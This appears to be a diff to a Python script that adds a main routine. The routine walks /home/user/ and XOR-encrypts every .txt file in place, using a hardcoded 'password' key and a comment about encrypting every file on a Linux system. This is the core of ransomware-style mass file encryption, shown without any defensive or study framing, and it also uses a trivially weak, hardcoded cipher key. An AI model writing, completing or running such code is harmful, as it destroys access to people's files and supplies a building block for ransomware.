@@ -14,4 +14,13 @@ class EncryptFileSystem(object):
             cipher_text.append(chr(ord(plain_text[i]) ^ ord(self.password[i % len(self.password)])))
         return ''.join(cipher_text)
 
-# Enumerate all files an encrypt them
+# Enumerate every file in a linux system using a loop and encrypt them
+def main():
+    password = 'password'
+    encrypt_fs = EncryptFileSystem(password)
+    for root, dirs, files in os.walk('/home/user/'):
+        for file in files:
+            if file.endswith('.txt'):
+                print('Encrypting file: ' + file)
+                encrypt_fs.encrypt_file(os.path.join(root, file))
+                
